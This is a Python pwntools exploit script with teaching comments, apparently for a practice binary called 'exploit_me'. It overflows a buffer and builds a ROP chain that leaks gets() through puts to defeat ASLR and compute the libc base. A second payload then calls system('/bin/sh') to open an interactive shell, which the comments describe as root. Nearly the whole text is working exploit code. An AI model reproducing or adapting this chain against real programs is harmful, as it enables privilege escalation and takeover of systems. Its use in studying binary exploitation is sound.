#!/usr/bin/env python3

from pwn import *

# Specify the binary file we want to exploit
context.binary = binary = './exploit_me'

# Construct an ROP object from the binary
# pwntools provides the ROP Class to allow finding gadgets very easily 
elf = ELF(binary)
rop = ROP(elf)

# We also need the libc as a ELF object
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# The process is automatically set by the context variable above
p = process()

#### Bypassing ASLR ####

padding = b'A'*18 # We need padding to get to the return address
payload = padding 
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) # We let pwntools search for the gadget 'pop rdi' and add the gadgets address to our payload
payload += p64(elf.got.gets) # We use the .got.plt to find the dynamically linked address of gets()
payload += p64(elf.plt.puts) # We use the .plt to find the address of puts()
payload += p64(elf.symbols.main) # We enter the address of the main function to run it for the exploit afterwards

p.recvline() # Receive some blabla e.g. "Enter your name"
p.sendline(payload) # Send the payload as the name
p.recvline() # Receive some blabla e.g. "Your name is..."" + some padding from above

# Now our main function is at its end and will begin to run our ROP chain (pop gets() into $RDI -> Execute puts() -> Execute main())
leak = u64(p.recvline().strip().ljust(8,b'\0')) # The received bytes are not always of length 8, therefore we have to do some stripping and padding 

log.info(f'Gets leak => {hex(leak)}') 
# We calculate our libc base address by subtracting our leaked gets() address from the offset of gets() provided in the libc binary
# this works since the offsets in the libc do not change
libc.address = leak - libc.symbols.gets 
log.info(f'Libc base => {hex(libc.address)}')

#### Exploiting the binary ####
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) # We need an 'pop rdi' gadget in order to set an argument for system()
# 'bin/sh' is the argument we want to pass to execute a shell with root privileges
payload += p64(next(libc.search(b'/bin/sh'))) # search() looks for the string 'bin/sh' in the virtual address space of the libc --> Thereby we do not have to put the string into memory ourselves
payload += p64(rop.find_gadget(['ret'])[0]) # We just need this for stack alignment. It is not important why.
payload += p64(libc.symbols.system) # Get the address of the system() function using our newly set base address for the libc

p.recvline() # Receive some blabla e.g. "Enter your name"
p.sendline(payload) # Send the new payload
p.recvline() # Receive some blabla e.g. "Your name is..."" + some padding from above

p.interactive() # Switch to interactive mode to enjoy the shell